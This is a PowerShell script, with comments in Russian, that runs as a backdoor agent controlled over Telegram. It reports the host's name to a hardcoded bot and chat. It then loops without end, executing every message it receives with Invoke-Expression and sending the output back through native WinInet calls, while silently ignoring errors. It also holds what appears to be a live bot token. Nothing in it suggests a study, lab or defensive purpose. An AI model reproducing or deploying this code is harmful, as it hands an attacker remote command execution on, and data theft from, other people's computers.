# --- CONFIGURATION ---
$BotToken = "7954516260:AAF_dtgm2s8z9foCBjvuvCmzUtz1WTSUToo"
$ChatID   = "5703239051"

# --- WINAPI DEFINITIONS ---
if (-not ([System.Type]::GetType("WinInet"))) {
    $Win32 = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Text;

    public class WinInet {
        [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr InternetOpen(string agent, int accessType, string proxy, string proxyBypass, int flags);

        [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr InternetConnect(IntPtr hInternet, string server, int port, string user, string pass, int service, int flags, int context);

        [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr HttpOpenRequest(IntPtr hConnect, string verb, string objectName, string version, string referer, string[] acceptTypes, int flags, int context);

        [DllImport("wininet.dll", SetLastError = true)]
        public static extern bool HttpSendRequest(IntPtr hRequest, string headers, int headersLength, byte[] optional, int optionalLength);

        [DllImport("wininet.dll", SetLastError = true)]
        public static extern bool InternetCloseHandle(IntPtr hInternet);
    }
"@
    Add-Type -TypeDefinition $Win32
}

# --- CORE NETWORK FUNCTION ---
function Send-NativeRequest {
    param([string]$Method, [string]$Endpoint, [string]$JsonData)
    
    $HostName = "api.telegram.org"
    $Path = "/bot$BotToken/$Endpoint"
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($JsonData)
    $Headers = "Content-Type: application/json`r`n"

    $hSession = [WinInet]::InternetOpen("Mozilla/5.0", 1, $null, $null, 0)
    $hConnect = [WinInet]::InternetConnect($hSession, $HostName, 443, $null, $null, 3, 0, 0)
    
    # Flags: SECURE (0x00800000) | NO_CACHE (0x04000000) | RELOAD (0x80000000)
    $Flags = 0x00800000 -bor 0x04000000 -bor 0x80000000
    $hRequest = [WinInet]::HttpOpenRequest($hConnect, $Method, $Path, $null, $null, $null, $Flags, 0)
    $Success = [WinInet]::HttpSendRequest($hRequest, $Headers, $Headers.Length, $Bytes, $Bytes.Length)
    
    [WinInet]::InternetCloseHandle($hRequest) | Out-Null
    [WinInet]::InternetCloseHandle($hConnect) | Out-Null
    [WinInet]::InternetCloseHandle($hSession) | Out-Null
}

# --- MAIN LOGIC ---
$LastUpdateID = 0
Send-NativeRequest "POST" "sendMessage" "{""chat_id"":""$ChatID"",""text"":""Agent Online: $env:COMPUTERNAME""}"

while($true) {
    try {
        $Updates = Invoke-RestMethod "https://api.telegram.org/bot$BotToken/getUpdates?offset=$($LastUpdateID + 1)"
        
        foreach ($Upd in $Updates.result) {
            $LastUpdateID = $Upd.update_id
            $Cmd = $Upd.message.text
            
            if ($null -ne $Cmd) {
                # 1. Исполнение команды
                $Output = Invoke-Expression $Cmd 2>&1 | Out-String
                if ([string]::IsNullOrWhiteSpace($Output)) { $Output = "Done (No Output)." }
                
                # 2. Логика разбиения текста (Chunking)
                $MaxLen = 3800 # Запас под заголовок и JSON-структуру
                if ($Output.Length -gt $MaxLen) {
                    for ($i = 0; $i -lt $Output.Length; $i += $MaxLen) {
                        $Chunk = $Output.Substring($i, [Math]::Min($MaxLen, $Output.Length - $i))
                        $PartInfo = "(Part $(($i/$MaxLen) + 1))"
                        $Payload = @{ chat_id = $ChatID; text = "[$env:COMPUTERNAME] $PartInfo`n$Chunk" } | ConvertTo-Json
                        Send-NativeRequest "POST" "sendMessage" $Payload
                        Start-Sleep -Milliseconds 200 # Пауза, чтобы Telegram не забанил за спам
                    }
                } else {
                    # Обычная отправка, если текст короткий
                    $Payload = @{ chat_id = $ChatID; text = "[$env:COMPUTERNAME]`n$Output" } | ConvertTo-Json
                    Send-NativeRequest "POST" "sendMessage" $Payload
                }
            }
        }
    } catch { 
        # Ошибки игнорируем
    }
    Start-Sleep -Seconds 5
}